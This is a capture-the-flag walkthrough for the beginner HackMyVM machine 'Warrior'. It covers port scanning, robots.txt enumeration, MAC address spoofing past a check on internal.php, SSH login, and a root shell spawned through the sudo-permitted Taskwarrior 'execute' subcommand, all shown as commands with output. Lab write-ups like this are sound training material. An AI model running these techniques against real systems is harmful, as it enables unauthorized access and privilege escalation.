# Warrior

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Warrior | sml | Beginner | HackMyVM |

**Summary:** Warrior is a beginner-level CTF machine from HackMyVM that demonstrates network-layer authentication bypass and privilege escalation through misconfigured sudo permissions. The attack path begins with network reconnaissance revealing exposed robots.txt entries, leading to the discovery of an internal.php endpoint protected by MAC address validation. By spoofing the network interface MAC address to match the required pattern (00:00:00:00:00:a?), attackers can bypass this authentication mechanism and retrieve hardcoded credentials. SSH access is gained using the discovered username and password. Privilege escalation is achieved by exploiting sudo permissions on the Taskwarrior binary (/usr/bin/task), which allows arbitrary command execution through its `execute` subcommand, spawning a root shell. The machine emphasizes the importance of proper access controls, the dangers of MAC address-based authentication, and the risks of granting sudo permissions to binaries with command execution capabilities.

---

## Reconnaissance

### Network Discovery

Initial network scanning identified the target machine on the local network using a PowerShell scanning script:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.65 08:00:27:CE:B5:62 VirtualBox
```

The target was identified at **192.168.100.65** with a VirtualBox MAC address, confirming it as a virtual machine target.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was performed to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ nmap -sC -sV -p- 192.168.100.65
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 22:08 WIB
Nmap scan report for 192.168.100.65
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 25:16:8d:63:6b:75:f0:59:55:d4:b0:2d:75:8d:e0:e6 (RSA)
|   256 1e:29:d0:f4:c5:95:e7:40:30:2b:35:f7:a3:bc:36:75 (ECDSA)
|_  256 cc:b1:52:b3:d7:ef:cd:73:4c:fc:f6:b5:51:77:ea:f3 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 7 disallowed entries
| /admin /secret.txt /uploads/id_rsa /internal.php
|_/internal /cms /user.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.97 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian 5 running, potential entry point if credentials are discovered
- **Port 80 (HTTP)**: nginx 1.18.0 web server with a **robots.txt** file containing 7 disallowed entries
- **robots.txt entries**: /admin, /secret.txt, /uploads/id_rsa, /internal.php, /internal, /cms, /user.txt

The presence of robots.txt with multiple disallowed paths suggests potential information disclosure and hidden endpoints.

### Web Application Enumeration

#### Homepage Analysis

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65
<h1>WARRIOR</h1>
<!-- YEAH -->
```

The homepage displays a simple "WARRIOR" heading with an HTML comment "YEAH", providing minimal information.

#### Robots.txt Investigation

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/robots.txt
Disallow:/admin
Disallow:/secret.txt
Disallow:/secret.txt
Disallow:/uploads/id_rsa
Disallow:/internal.php
Disallow:/internal
Disallow:/cms
Disallow:/user.txt
```

The robots.txt file confirms seven disallowed paths, revealing potentially sensitive endpoints that require further investigation.

#### Endpoint Enumeration

Each endpoint discovered in robots.txt was systematically tested:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/admin
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/secret.txt
0123456789ABCDEF

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/uploads/id_rsa
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/internal.php
Hey bro, you need to have an internal MAC as 00:00:00:00:00:a? to read your pass..  

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/internal
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/cms
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ curl 192.168.100.65/user.txt
loco
```

**Critical Findings:**
- **/secret.txt**: Contains a hexadecimal string `0123456789ABCDEF`, likely a hint for the MAC address pattern
- **/internal.php**: Returns a message requiring a specific MAC address pattern `00:00:00:00:00:a?` to access password information. The message addresses "bro", potentially revealing a username.
- **/user.txt**: Contains the string "loco", possibly another username or clue

---

## Initial Access

### MAC Address Spoofing

The critical vulnerability lies in the **internal.php** endpoint, which validates client MAC addresses at the network layer before revealing password information. The application expects a MAC address matching the pattern `00:00:00:00:00:a?`, where `?` represents a single hexadecimal character.

The **secret.txt** file provides a hexadecimal range (`0123456789ABCDEF`), indicating the last character could be any hex digit (0-9, A-F).

**Technical Challenge - WSL Limitations**: Initially, enumeration was performed from a WSL (Windows Subsystem for Linux) environment. However, MAC address spoofing in WSL presents significant complications due to its virtualized networking architecture and limited direct hardware access. WSL2 uses a Hyper-V-based virtual network adapter where MAC address manipulation requires complex Windows-level network adapter configuration and lacks straightforward command-line tools available in native Linux environments.

**Solution**: To overcome this limitation, a dedicated Kali Linux VM was deployed in VirtualBox, which provides direct control over virtual network adapter hardware settings including MAC address configuration.

To bypass this authentication mechanism, the network interface MAC address must be spoofed to match the required pattern. Using VirtualBox settings, the MAC address was manually changed to test various combinations:

![](image.png)

The MAC address was successfully changed to `0000000000AF` through VirtualBox's network adapter settings.

### Credential Discovery

After spoofing the MAC address to `0000000000AF`, accessing the internal.php endpoint from the Kali VM revealed the password. The Kali VM was accessed via SSH from the WSL terminal (since it was started in headless mode without GUI):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh kali@192.168.100.66
...
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.100.65/internal.php
<br>Good!!!!!<!-- Your password is: Z[REDACTED] --> 
```

**Discovered Credentials:**
- **Password**: `Z[REDACTED]` (embedded in HTML comment)
- **Potential Usernames**: "bro" (from internal.php message), "loco" (from /user.txt)

### SSH Authentication

Using the discovered password with the username "bro" (referenced in the internal.php message "Hey bro"), SSH access was successfully obtained:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/warrior]
└─$ ssh bro@192.168.100.65
...
bro@192.168.100.65's password:
Linux warrior 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64
...
bro@warrior:~$ id
uid=1000(bro) gid=1000(bro) groups=1000(bro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
bro@warrior:~$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Feb  8  2022 .
drwxr-xr-x 18 root root 4096 Feb  8  2022 ..
drwxr-xr-x  3 bro  bro  4096 Feb  8  2022 bro
bro@warrior:~$ ls -la
total 32
drwxr-xr-x 3 bro  bro  4096 Feb  8  2022 .
drwxr-xr-x 3 root root 4096 Feb  8  2022 ..
-rw-r--r-- 1 bro  bro   220 Feb  8  2022 .bash_logout
-rw-r--r-- 1 bro  bro  3526 Feb  8  2022 .bashrc
drwxr-xr-x 3 bro  bro  4096 Feb  8  2022 .local
-rw-r--r-- 1 bro  bro   807 Feb  8  2022 .profile
-rw------- 1 bro  bro    21 Feb  8  2022 user.txt
-rw------- 1 bro  bro    53 Feb  8  2022 .Xauthority
```

**User Flag Obtained**: user.txt is present in the home directory with restrictive permissions (accessible only by user "bro").

---

## Privilege Escalation

### Sudo Permissions Enumeration

Initial privilege escalation enumeration revealed an interesting configuration:

```bash
bro@warrior:~$ sudo -l
-bash: sudo: command not found
bro@warrior:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 182600 Feb 27  2021 /usr/sbin/sudo
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-- 1 root messagebus 51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
```

While `sudo` was not in the user's PATH, the binary existed at `/usr/sbin/sudo`. Using the full path revealed privileged permissions:

```bash
bro@warrior:~$ /usr/sbin/sudo -l
Matching Defaults entries for bro on warrior:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bro may run the following commands on warrior:
    (root) NOPASSWD: /usr/bin/task
bro@warrior:~$ ls -la /usr/bin/task
-rwxr-xr-x 1 root root 2189544 May 28  2021 /usr/bin/task
bro@warrior:~$ file /usr/bin/task
/usr/bin/task: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=07864606c9098fe3fb128890b2c322d9de59a2fc, for GNU/Linux 3.2.0, stripped
```

**Key Finding**: User "bro" can execute `/usr/bin/task` as root without a password (NOPASSWD). The `task` binary is **Taskwarrior**, a command-line task management application.

### Taskwarrior Binary Analysis

Testing the task binary revealed its default behavior:

```bash
bro@warrior:~$ /usr/sbin/sudo /usr/bin/task
[/usr/bin/task next]

ID Age    Description        Urg
 1 4.0y   Change my password    2

1 task
```

The binary displays existing tasks by default. Research into Taskwarrior's capabilities via GTFOBins revealed that the `execute` subcommand can spawn system shells:

![](image-1.png)

According to GTFOBins, Taskwarrior's `execute` functionality allows running arbitrary external commands. When executed via `sudo`, this command runs with root privileges without dropping them.

The `task` man page confirms this capability:

![](image-2.png)

The `task execute <external command>` subcommand executes specified commands directly, providing seamless integration for task automation. In this context, it allows arbitrary command execution as root.

### Root Shell Exploitation

Leveraging the `execute` subcommand to spawn a bash shell with root privileges:

```bash
bro@warrior:~$ /usr/sbin/sudo /usr/bin/task execute /bin/bash
root@warrior:/home/bro# cd
root@warrior:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
warrior
root@warrior:~# cat /root/root.txt /home/bro/user.txt
HPi[REDACTED]
LcH[REDACTED]
```

**Root access achieved!**

**pwned!**

---

## Attack Chain Summary

1. **Reconnaissance**: Performed comprehensive Nmap scan identifying SSH (22) and HTTP (80) services. Discovered robots.txt file exposing seven hidden endpoints including /internal.php and /secret.txt.

2. **Vulnerability Discovery**: Identified MAC address-based authentication on /internal.php endpoint requiring pattern `00:00:00:00:00:a?`. Retrieved hexadecimal hint (`0123456789ABCDEF`) from /secret.txt. Discovered potential username "bro" in internal.php response message.

3. **Exploitation**: Spoofed network interface MAC address to `0000000000AF` using VirtualBox network settings to bypass authentication. Successfully accessed /internal.php endpoint revealing hardcoded password `Z[REDACTED]` in HTML comments. Authenticated via SSH using credentials `bro:Z[REDACTED]`.

4. **Internal Enumeration**: Enumerated sudo permissions discovering `/usr/bin/task` (Taskwarrior) executable with NOPASSWD root privileges. Identified task binary as version from May 2021 with `execute` subcommand capability.

5. **Privilege Escalation**: Exploited Taskwarrior's `execute` subcommand to spawn root shell via `sudo /usr/bin/task execute /bin/bash`. Obtained both user and root flags completing full system compromise.
